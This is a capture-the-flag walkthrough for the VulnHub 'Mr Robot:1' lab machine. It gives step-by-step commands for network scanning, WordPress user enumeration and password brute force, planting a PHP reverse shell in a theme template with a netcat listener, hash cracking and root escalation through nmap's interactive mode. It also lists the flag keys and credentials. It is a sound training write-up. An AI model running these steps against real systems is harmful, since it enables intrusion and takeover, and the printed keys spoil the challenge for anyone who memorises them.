[![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](#) [![Virtual Lab](https://img.shields.io/badge/VirtualBox-183A61?style=for-the-badge&logo=virtualbox&logoColor=white)](#)  [![VulnHub](https://img.shields.io/badge/VulnHub-26A69A?style=for-the-badge&logo=v&logoColor=white)](https://www.vulnhub.com)  [![Mr Robot:1](https://img.shields.io/badge/Mr_Robot_1-D32F2F?style=for-the-badge&logo=robots&logoColor=white)](https://www.vulnhub.com/entry/mr-robot-1,151/)  [![Nmap](https://img.shields.io/badge/Nmap-4CAF50?style=for-the-badge&logo=n&logoColor=white)](https://nmap.org)  [![Wpscan](https://img.shields.io/badge/Wpscan-F44336?style=for-the-badge&logo=wordpress&logoColor=white)](https://github.com/wpscanteam/wpscan)  

[![Dirsearch](https://img.shields.io/badge/Dirsearch-FF9800?style=for-the-badge&logo=search&logoColor=white)](https://github.com/maurosoria/dirsearch)  [![Netcat](https://img.shields.io/badge/Netcat-9E9E9E?style=for-the-badge&logo=nc&logoColor=white)](https://nc110.sourceforge.io/)  [![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org)  [![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)](https://www.gnu.org/software/bash/)  

[![WordPress](https://img.shields.io/badge/WordPress-21759B?style=for-the-badge&logo=wordpress&logoColor=white)](https://wordpress.org)  [![Reverse Shell](https://img.shields.io/badge/Reverse_Shell-000000?style=for-the-badge&logo=linux&logoColor=white)](#)  [![CrackStation](https://img.shields.io/badge/CrackStation-5D4037?style=for-the-badge&logo=lock&logoColor=white)](https://crackstation.net)  

# Walkthrough Mr Robot:1

## Setting up the machine
The machine is set up in a closed environment [internal adapter] in ther virtual machine enabling communication only through that adapter.

### Setup a Virtual Lab
1. Setup the Network to be internal adapter and name it `Test-network`.
2. In the command prompt in the windows go to the virtual Box directory 
```cmd
cd "\Program Files\Oracle\VirtualBox"
```
3. Now type in
```cmd
vboxmanage dhcpserver add --network=Test-network --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable
```
This enables the dhcp server virtually and allocates the ip address for range 10.38.1.110-120.

4. Now you have to enable another adapter for your kali linux machine having connection with the internal adapter `Test-network`.
![Screenshot 1](./pictures/0.png "Screenshot of the setup")
5. Boot up Both the machines.
 



--
## Guide:
### Key-1-of-3
1. Run the below command to know the available devices.
```bash
sudo arp-scan -l 
```
![ifconfig1](./pictures/2.png "ifconfig")

You can see my ip address.

![arp-scan -l](./pictures/1.png "ifconfig")
Now we know the Ip addresses.
### Ip-addresses :
| Ip address  | Associated device |
| ------------- |:-------------:|
| 10.38.1.112      | Kali-VM     |
| 10.38.1.113      | Mr_Robot     |

2. Run the command   
```bash
nmap -p- -A 10.38.1.113 -oN scan.txt
``` 
![nmap](./pictures/3.png "nmap -p- -A 10.38.1.113 -oN scan.txt")
Here is the screenshot of scan report.

3. From the scan, Port 80 is open indicating an active web server in there
4. Go to the Browser and try to open ther site.
5. Since this is a web server, we can see whether there are any hidden directories in there
```bash
dirsearch -u http://10.38.1.113/
```
![Dirsearch](./pictures/4.png "Dirsearsh result")

This image shows the output of dirsearch which has successfull pages [code = 200]
6.By examining all the sites, we can see the key in robots.txt; `http://10.38.1.113/robots.txt`.

7. By going to the site `http://10.38.1.113/key-1-of-3.txt` we can see the 1st key
```
073403c8a58a1f80d943455fb30724b9
```
![Robots.txt](./pictures/5.png "Robots")

### Key-2-of-3.txt

1. In the same `http://10.38.1.113/robots.txt`, we find a `.dic` file containing large number of elements 
use `wc <filename>` to see the number of entries in the file.
2. We can observe that the words are repeated and in the file.
3. Use the command below, to sort it and write to another file
```bash
cat fsocity.dic | sort -u > sorted_fsocity.txt
```
4. If we have a look at the directories, we can notice a wordpress login page
![Dirsearch-wplogin](./pictures/6.png "wordpress")
5. Open the link in the browser - `http://10.38.1.113/wp-login.php`.
6. We have a login page and a wordlist.
7. use `wpscan` to enumirate for the available users.
```bash
wpscan -v --url http://10.38.1.113/wp-login.php --enumerate --users-list sorted_fsocity.txt -o wpscan.txt
```
![wp-users](./pictures/7.png "wordpress- users enumirated and found users")
Users available in the server

8. Password enumiration : 
```bash
wpscan -v --url http://10.38.1.113/wp-login.php -U "elliot" -P sorted_fsocity.txt -o password_elliot.txt
```
![Wp - password](./pictures/8.png "Password for the user elliot")
Password for the user elliot.

9. Now login to the user using the credentilas we got `Username: elliot, Password: ER28-0652` 
10. Navigate to the `appearance -> editor -> 404 Template*`
11. Here we shall place a script that opens a shell [reverse shell]
12. Type in `locate php-reverse` and copy the file named `/usr/share/laudanum/wordpress/templates/php-reverse-shell.php` to your `pwd`.
13. Edit the ip address and portnumber to Ip = your kali linux ip address and port number = default https port number, In  my case its `IP: 10.38.1.112` & `Port: 443`.
14. Now open a new terminal instance `ctrl+shift+T` and type in the below command to start listining to the `Port 443`.
```bash
sudo nc -lvnp 443
```
15. Once yoy started this, go to the browser and type in any name followed by the ipaddress of the server
```web
For example : http://10.38.1.113/hi
```
![shell](./pictures/9.png "reverse shell")
This results a forbidden page and our script is there in forbidden page and it gets executed. leading to `daemon` shell behind.

16. Here the choice of template made in `10th step` is not to be only `404 template`. It can be any of the listed. but redirecting to a forbidden page is a way more easier that redirecting to any particular page to `execute` the script. Any page that has a `client-side` error returns `404` and makes executing the script easy.
17. Now navigate to `cd home/robot` to find a `Key-2-of-3.txt` owned by user, `robot` and a `password.raw-md5` hash file containing the hash of the robot password saying, `robot:c3fcd3d76192e4007dfb496cca67e13b`
18. Decrypting the hash using [crackstation](https://crackstation.net/) , we get the password as `abcdefghijklmnopqrstuvwxyz`
19. Type in `sudo su` -> this results in `su: must be run from a terminal`.
```Explaination
This is because the demon by default has no shell;
`$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
`
The above output says that.
since we dont have a shell we cannot switch users.
```
20. execute the below script in ther shell to invoke a bash shell for the user `daemon`
```bash
python -c 'import pty;pty.spawn("/bin/bash")'

```
21. Now we have a shell and we can login using `sudo su robot` and the `password : abcdefghijklmnopqrstuvwxyz`
22. Now we can see the contents of the file `Key-2-of-3.txt`
23. `Key-2-of-3.txt : 822c73956184f694993bede3eb39f959`

### Key-3-of-3.txt:

1. For this key we use the interactive mode of nmap which inturn can lead to a root shell 
[nmap vulnerability](https://vk9-sec.com/nmap-privilege-escalation/)
```Previlage Esclation 
In a interactive mode if we type in `!/bin/bash` we get the bash shell 
The maximum previlage is root, Nmap runnig in highest previlage causes this.
```
2. nmap --interactive
    1. Runs the nmap with higher previlage [previlage escalation]
    2. In an interactive mode if "!bash" is typed in, then the shell gets opened with the previlage of the interacting software.
    3. his results in higher previlage shell out.
    4. If !bash is typed in
        results, a current user owned bash shell
    5. If !sudo /bin/bash is typed in,
        results in saying
                `nmap> !sudo /bin/bash
                !sudo /bin/bash
                [sudo] password for robot: abcdefghijklmnopqrstuvwxyz
                robot is not in the sudoers file.  This incident will be reported.`

3. Robot is not in the sudoers file.

4. However, we are able to invoke a shell 
5. Since sh is a root owned shell by default, try
    1. `!sh` [this is a root shell by default].
        this resulted in ,
        nmap> !sh
        !sh
        `#` whoami
        `root`
6. Finally we got the `root` shell so we can see the contents of the root and there you go `cat /root/key-3-of-3.txt` and the key is `04787ddef27c3dee1ee161b21670b4e4`



















